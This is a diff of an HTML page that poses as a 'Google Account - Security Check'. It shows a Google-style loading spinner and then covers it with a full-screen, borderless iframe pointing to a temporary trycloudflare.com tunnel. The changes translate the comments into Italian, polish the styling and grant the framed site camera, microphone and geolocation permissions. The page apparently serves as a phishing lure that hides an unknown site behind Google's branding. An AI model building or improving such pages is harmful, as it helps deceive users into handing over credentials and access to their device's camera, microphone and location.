@@ -5,18 +5,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Google Account - Security Check</title>
     <style>
-        /* Ensures the Iframe is full-screen without borders or scrollbars */
+        /* Rende l'iframe a tutto schermo e rimuove scroll fastidiosi */
         body, html { 
             margin: 0; 
             padding: 0; 
             height: 100%; 
             width: 100%; 
             overflow: hidden; 
-            background-color: white; 
+            background-color: #ffffff; 
             font-family: 'Roboto', Arial, sans-serif;
         }
 
-        /* Positions the loading animation BEHIND the iframe */
+        /* Posiziona lo spinner di caricamento dietro l'iframe */
         .loader-container {
             display: flex;
             flex-direction: column;
@@ -25,7 +25,7 @@
             height: 100vh;
             position: absolute;
             width: 100%;
-            z-index: 1; /* Stay behind */
+            z-index: 1;
         }
 
         iframe { 
@@ -35,30 +35,38 @@
             width: 100%; 
             height: 100%; 
             border: none; 
-            z-index: 2; /* Stay in front */
+            z-index: 2; /* L'iframe copre lo spinner una volta caricato */
             background-color: transparent;
         }
 
+        /* Spinner in stile Google */
         .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #4285F4;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4285F4;
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
+            width: 28px;
+            height: 28px;
+            animation: spin 0.8s linear infinite;
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .loading-text {
+            color: #5f6368; 
+            margin-top: 20px; 
+            font-size: 14px;
+            letter-spacing: 0.1px;
+        }
     </style>
 </head>
 <body>
 
     <div class="loader-container">
         <div class="spinner"></div>
-        <p style="color: #5f6368; margin-top: 15px;">One moment...</p>
+        <p class="loading-text">One moment...</p>
     </div>
 
-    <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com"></iframe>
+    <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com" allow="camera; microphone; geolocation"></iframe>
 
 </body>
 </html>
